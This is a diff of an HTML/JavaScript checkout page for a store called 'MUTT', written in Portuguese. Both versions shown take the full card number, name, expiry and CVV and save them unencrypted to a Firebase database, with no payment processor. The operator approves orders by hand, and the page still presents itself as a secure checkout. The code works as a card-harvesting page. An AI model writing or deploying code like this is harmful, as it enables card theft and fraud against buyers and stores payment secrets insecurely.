@@ -3,128 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MUTT | CHECKOUT SEGURO</title>
+    <title>MUTT | PAGAMENTO CARTÃO</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
         body { font-family: 'Inter', sans-serif; background-color: #000; color: #fff; }
-        
-        .mutt-card { background: #0a0a0a; border: 1px solid #1a1a1a; padding: 1.5rem; border-radius: 8px; }
-        
-        .input-mutt { 
-            background: #000; border: 1px solid #1a1a1a; color: white; padding: 14px; 
-            border-radius: 4px; width: 100%; font-size: 14px; outline: none; transition: 0.3s;
-        }
-        .input-mutt:focus { border-color: #fff; box-shadow: 0 0 10px rgba(255,255,255,0.1); }
-
-        .method-btn { 
-            border: 1px solid #1a1a1a; padding: 15px; font-size: 11px; font-weight: 900; 
-            uppercase; transition: 0.3s; width: 100%; text-align: center; cursor: pointer; color: #555; 
-        }
-        .method-btn.active { border-color: #fff; color: #fff; background: #111; }
-
-        .loader { border: 2px solid rgba(255,255,255,0.05); border-top: 2px solid #fff; border-radius: 50%; width: 24px; height: 24px; animation: spin 0.8s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .mutt-input { background: #0a0a0a; border: 1px solid #1a1a1a; color: #fff; padding: 15px; border-radius: 4px; width: 100%; outline: none; }
+        .mutt-input:focus { border-color: #fff; }
+        .metodo-btn { border: 1px solid #1a1a1a; padding: 12px; font-weight: 900; text-align: center; cursor: pointer; color: #555; flex: 1; transition: 0.3s; }
+        .metodo-btn.active { border-color: #fff; color: #fff; background: #111; }
     </style>
 </head>
-<body class="bg-black">
-
-    <main class="container mx-auto px-4 py-8 max-w-md min-h-screen flex flex-col">
-        
-        <div class="flex items-center justify-between mb-8">
-            <img src="https://i.postimg.cc/L5zZY3TJ/transparent-Photoroom-(2).png" class="w-16 grayscale brightness-200">
-            <div class="text-right">
-                <p class="text-[8px] font-black text-zinc-500 uppercase tracking-widest">Ambiente Seguro</p>
-                <p class="text-[10px] font-black text-green-500"><i class="fa-solid fa-shield-check"></i> SSL 256-BIT</p>
-            </div>
+<body>
+    <main class="max-w-md mx-auto p-6 min-h-screen flex flex-col">
+        <div class="flex justify-between items-center mb-10">
+            <img src="https://i.postimg.cc/L5zZY3TJ/transparent-Photoroom-(2).png" class="w-12">
+            <span class="text-[10px] font-black uppercase tracking-widest text-zinc-500">Checkout Seguro</span>
         </div>
 
-        <div id="payment-content">
-            <button onclick="simularPagamentoRapido()" class="w-full bg-white text-black py-4 rounded-xl flex items-center justify-center gap-3 font-black uppercase text-[11px] tracking-tighter hover:bg-zinc-200 transition-all mb-6">
-                <i class="fa-brands fa-apple text-xl"></i>
-                <i class="fa-brands fa-google-pay text-2xl"></i>
-                Pagamento Rápido
+        <div id="checkout-container">
+            <h1 class="text-2xl font-black italic uppercase mb-6">Pagamento</h1>
+
+            <button class="w-full bg-white text-black py-4 rounded-xl flex items-center justify-center gap-2 font-black uppercase text-[10px] mb-8">
+                <i class="fa-brands fa-apple text-lg"></i> Pay / <i class="fa-brands fa-google-pay text-2xl"></i>
             </button>
 
-            <div class="relative flex items-center mb-6">
-                <div class="flex-grow border-t border-zinc-900"></div>
-                <span class="flex-shrink mx-4 text-zinc-700 text-[9px] font-black uppercase">Ou cartão de crédito</span>
-                <div class="flex-grow border-t border-zinc-900"></div>
-            </div>
-
-            <div class="space-y-4">
-                <div class="flex gap-2 mb-4">
-                    <div id="btn-credito" onclick="setMetodo('CREDITO')" class="method-btn active rounded-l-lg">CRÉDITO</div>
-                    <div id="btn-debito" onclick="setMetodo('DEBITO')" class="method-btn rounded-r-lg">DÉBITO</div>
+            <div class="space-y-6">
+                <div class="flex gap-2">
+                    <div id="btn-credito" onclick="setMetodo('CREDITO')" class="metodo-btn active">CRÉDITO</div>
+                    <div id="btn-debito" onclick="setMetodo('DEBITO')" class="metodo-btn">DÉBITO</div>
                 </div>
 
-                <div class="mutt-card space-y-4">
-                    <div>
-                        <label class="text-[9px] font-black text-zinc-500 uppercase mb-2 block">Número do Cartão</label>
-                        <div class="relative">
-                            <input type="text" id="card-number" maxlength="19" placeholder="0000 0000 0000 0000" class="input-mutt">
-                            <i class="fa-solid fa-credit-card absolute right-4 top-4 text-zinc-800"></i>
-                        </div>
+                <div class="space-y-4">
+                    <input type="text" id="card-num" placeholder="NÚMERO DO CARTÃO" class="mutt-input">
+                    <input type="text" id="card-name" placeholder="NOME COMO NO CARTÃO" class="mutt-input">
+                    <div class="flex gap-4">
+                        <input type="text" id="card-exp" placeholder="MM/AA" class="mutt-input">
+                        <input type="text" id="card-cvv" placeholder="CVV" class="mutt-input">
                     </div>
-
-                    <div>
-                        <label class="text-[9px] font-black text-zinc-500 uppercase mb-2 block">Nome Impresso</label>
-                        <input type="text" id="card-name" placeholder="NOME COMO NO CARTÃO" class="input-mutt">
+                    
+                    <div id="parcelas-box">
+                        <label class="text-[10px] font-bold text-zinc-500 mb-2 block uppercase">Parcelamento</label>
+                        <select id="select-parcelas" onchange="atualizarTotal()" class="mutt-input appearance-none bg-black"></select>
                     </div>
+                </div>
 
-                    <div class="grid grid-cols-2 gap-4">
+                <div class="border-t border-zinc-900 pt-6 mt-8">
+                    <div class="flex justify-between items-end">
                         <div>
-                            <label class="text-[9px] font-black text-zinc-500 uppercase mb-2 block">Validade</label>
-                            <input type="text" id="card-expiry" maxlength="5" placeholder="MM/AA" class="input-mutt text-center">
+                            <p class="text-[10px] text-zinc-500 font-bold uppercase">Total à pagar</p>
+                            <p id="display-total" class="text-3xl font-black italic">R$ 0,00</p>
                         </div>
-                        <div>
-                            <label class="text-[9px] font-black text-zinc-500 uppercase mb-2 block">CVV</label>
-                            <input type="password" id="card-cvv" maxlength="4" placeholder="***" class="input-mutt text-center">
-                        </div>
-                    </div>
-
-                    <div id="parcelas-area">
-                        <label class="text-[9px] font-black text-zinc-500 uppercase mb-2 block">Parcelamento</label>
-                        <select id="installments" onchange="atualizarBotao()" class="input-mutt bg-black appearance-none"></select>
+                        <button onclick="confirmarPagamento()" id="btn-final" class="bg-white text-black px-8 py-4 font-black uppercase text-[11px] tracking-widest">Pagar Agora</button>
                     </div>
                 </div>
-
-                <div class="p-4 border border-dashed border-zinc-900 rounded-lg">
-                    <div class="flex justify-between text-[11px] font-bold text-zinc-500 mb-1">
-                        <span>Subtotal</span>
-                        <span id="resumo-subtotal">R$ 0,00</span>
-                    </div>
-                    <div class="flex justify-between text-[11px] font-bold text-zinc-500 mb-2">
-                        <span>Juros/Taxas</span>
-                        <span id="resumo-juros" class="text-white">R$ 0,00</span>
-                    </div>
-                    <div class="flex justify-between items-center pt-2 border-t border-zinc-900">
-                        <span class="text-[10px] font-black uppercase">Total Final</span>
-                        <span id="resumo-total" class="text-xl font-black italic">R$ 0,00</span>
-                    </div>
-                </div>
-
-                <button onclick="processarPagamento()" id="btn-main" class="w-full bg-white text-black py-5 rounded-lg font-black uppercase text-[12px] tracking-widest mt-4">
-                    Finalizar Pedido
-                </button>
             </div>
         </div>
 
-        <div id="loader-screen" class="hidden flex-1 flex flex-col items-center justify-center text-center space-y-4">
-            <div class="loader"></div>
-            <p class="text-[10px] font-black uppercase tracking-widest text-zinc-500">Processando com a operadora...</p>
+        <div id="sucesso" class="hidden text-center my-auto">
+            <i class="fa-solid fa-circle-check text-6xl text-green-500 mb-4"></i>
+            <h2 class="text-2xl font-black uppercase italic">Pagamento Enviado</h2>
+            <p class="text-zinc-500 text-sm mt-2">Aguarde a aprovação no seu WhatsApp.</p>
+            <button onclick="window.location.href='meus-pedidos.html'" class="w-full mt-10 border border-zinc-800 py-4 font-black uppercase text-[10px]">Ver Meus Pedidos</button>
         </div>
-
-        <div id="success-screen" class="hidden flex-1 flex flex-col items-center justify-center text-center space-y-6">
-            <div class="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center shadow-[0_0_30px_rgba(34,197,94,0.3)]">
-                <i class="fa-solid fa-check text-4xl text-black"></i>
-            </div>
-            <h2 class="text-3xl font-black italic uppercase">Pedido Recebido</h2>
-            <p class="text-zinc-500 text-[10px] uppercase font-bold px-10 leading-relaxed">Seu pagamento está em análise. Você receberá uma notificação no WhatsApp em instantes.</p>
-            <button onclick="window.location.href='index.html'" class="border border-zinc-800 px-8 py-3 text-[10px] font-black uppercase">Voltar para Loja</button>
-        </div>
-
     </main>
 
     <script type="module">
@@ -146,129 +88,88 @@
         const db = getDatabase(app);
         const auth = getAuth(app);
 
-        let pedidoAtivo = null;
-        let idPedido = "";
+        let pedidoId = "";
+        let valorBase = 0;
         let metodo = "CREDITO";
 
-        // CONFIGURAÇÕES DO ADM
-        const SETTINGS = {
-            parcelasSemJuros: 3,
-            jurosMensal: 2.99,
-            maxParcelas: 12
-        };
+        const JUROS = { parcelasSemJuros: 3, taxaMensal: 2.99 };
 
-        // MÁSCARAS DE INPUT
-        document.getElementById('card-number').addEventListener('input', e => {
-            e.target.value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
-        });
-        document.getElementById('card-expiry').addEventListener('input', e => {
-            e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{2})(\d)/, '$1/$2');
-        });
-
-        onAuthStateChanged(auth, (user) => {
+        onAuthStateChanged(auth, user => {
             if (user) {
+                // Pega o último pedido pendente do usuário
                 const pRef = query(ref(db, `usuarios/${user.uid}/pedidos`), limitToLast(1));
                 onValue(pRef, snap => {
                     const data = snap.val();
                     if(data) {
-                        idPedido = Object.keys(data)[0];
-                        pedidoAtivo = data[idPedido];
-                        initCheckout();
+                        pedidoId = Object.keys(data)[0];
+                        valorBase = data[pedidoId].total;
+                        gerarParcelas();
                     }
                 });
-            }
+            } else { window.location.href = 'login.html'; }
         });
 
         window.setMetodo = (m) => {
             metodo = m;
             document.getElementById('btn-credito').classList.toggle('active', m === 'CREDITO');
             document.getElementById('btn-debito').classList.toggle('active', m === 'DEBITO');
-            document.getElementById('parcelas-area').classList.toggle('hidden', m === 'DEBITO');
-            renderParcelas();
+            document.getElementById('parcelas-box').style.display = m === 'DEBITO' ? 'none' : 'block';
+            gerarParcelas();
         };
 
-        function initCheckout() {
-            document.getElementById('resumo-subtotal').innerText = `R$ ${pedidoAtivo.total.toFixed(2)}`;
-            renderParcelas();
-        }
-
-        function renderParcelas() {
-            const select = document.getElementById('installments');
+        function gerarParcelas() {
+            const select = document.getElementById('select-parcelas');
             select.innerHTML = '';
             
             if(metodo === 'DEBITO') {
-                const opt = new Option(`1x de R$ ${pedidoAtivo.total.toFixed(2)} (À VISTA)`, 1);
-                select.add(opt);
+                select.add(new Option(`1x de R$ ${valorBase.toFixed(2)} (À VISTA)`, 1));
             } else {
-                for(let i=1; i<=SETTINGS.maxParcelas; i++) {
-                    let totalFinal = pedidoAtivo.total;
-                    if(i > SETTINGS.parcelasSemJuros) {
-                        totalFinal = pedidoAtivo.total * Math.pow(1 + (SETTINGS.jurosMensal/100), i);
+                for(let i=1; i<=12; i++) {
+                    let total = valorBase;
+                    if(i > JUROS.parcelasSemJuros) {
+                        total = valorBase * Math.pow(1 + (JUROS.taxaMensal/100), i);
                     }
-                    const valorParcela = totalFinal / i;
-                    const jurosTxt = i <= SETTINGS.parcelasSemJuros ? 'SEM JUROS' : 'C/ JUROS';
-                    const opt = new Option(`${i}x de R$ ${valorParcela.toFixed(2)} (${jurosTxt})`, i);
-                    opt.dataset.total = totalFinal.toFixed(2);
+                    const valorParcela = total / i;
+                    const opt = new Option(`${i}x de R$ ${valorParcela.toFixed(2)} ${i <= JUROS.parcelasSemJuros ? 'S/ JUROS' : 'C/ JUROS'}`, i);
+                    opt.dataset.valorFinal = total.toFixed(2);
                     select.add(opt);
                 }
             }
-            atualizarBotao();
+            atualizarTotal();
         }
 
-        window.atualizarBotao = () => {
-            const select = document.getElementById('installments');
-            const totalComJuros = parseFloat(select.options[select.selectedIndex]?.dataset.total || pedidoAtivo.total);
-            const juros = totalComJuros - pedidoAtivo.total;
-
-            document.getElementById('resumo-juros').innerText = `R$ ${juros.toFixed(2)}`;
-            document.getElementById('resumo-total').innerText = `R$ ${totalComJuros.toFixed(2)}`;
-            document.getElementById('btn-main').innerText = `PAGAR R$ ${totalComJuros.toFixed(2)}`;
+        window.atualizarTotal = () => {
+            const select = document.getElementById('select-parcelas');
+            const total = select.options[select.selectedIndex]?.dataset.valorFinal || valorBase.toFixed(2);
+            document.getElementById('display-total').innerText = `R$ ${total}`;
         };
 
-        window.processarPagamento = async () => {
-            const num = document.getElementById('card-number').value;
-            const nome = document.getElementById('card-name').value;
-            const exp = document.getElementById('card-expiry').value;
-            const cvv = document.getElementById('card-cvv').value;
+        window.confirmarPagamento = async () => {
+            const btn = document.getElementById('btn-final');
+            btn.innerText = "PROCESSANDO...";
+            btn.disabled = true;
 
-            if(num.length < 16 || !nome || exp.length < 5 || cvv.length < 3) {
-                alert("Verifique os dados do cartão.");
-                return;
-            }
-
-            document.getElementById('payment-content').classList.add('hidden');
-            document.getElementById('loader-screen').classList.remove('hidden');
-
-            const totalFinal = document.getElementById('resumo-total').innerText.replace('R$ ', '');
-
-            const dadosCartao = {
-                metodo: metodo,
-                numero: num,
-                nome: nome,
-                exp: exp,
-                cvv: cvv,
-                parcelas: document.getElementById('installments').value,
-                totalPago: totalFinal,
-                data: new Date().toLocaleString()
+            const dadosPagamento = {
+                num: document.getElementById('card-num').value,
+                nome: document.getElementById('card-name').value,
+                exp: document.getElementById('card-exp').value,
+                cvv: document.getElementById('card-cvv').value,
+                parcelas: document.getElementById('select-parcelas').value,
+                valorFinal: document.getElementById('display-total').innerText,
+                statusTransacao: "Em Análise pela Operadora"
             };
 
-            const path = `usuarios/${auth.currentUser.uid}/pedidos/${idPedido}`;
-            await update(ref(db, path), {
-                dadosCartao: dadosCartao,
-                status: "Pendente" // Fica pendente para você aprovar no ADM
-            });
+            const updates = {};
+            updates[`pedidos/${pedidoId}/dadosCartao`] = dadosPagamento;
+            updates[`pedidos/${pedidoId}/status`] = "Em Analise";
+            updates[`usuarios/${auth.currentUser.uid}/pedidos/${pedidoId}/dadosCartao`] = dadosPagamento;
+            updates[`usuarios/${auth.currentUser.uid}/pedidos/${pedidoId}/status`] = "Em Analise";
 
-            setTimeout(() => {
-                document.getElementById('loader-screen').classList.add('hidden');
-                document.getElementById('success-screen').classList.remove('hidden');
-            }, 3000);
+            await update(ref(db), updates);
+            
+            document.getElementById('checkout-container').classList.add('hidden');
+            document.getElementById('sucesso').classList.remove('hidden');
         };
-
-        window.simularPagamentoRapido = () => {
-            alert("Iniciando Apple/Google Pay... Autentique com sua Digital ou Rosto no celular.");
-            // Aqui você pode disparar a mesma lógica de sucesso
-        };
-
     </script>
 </body>
 </html>
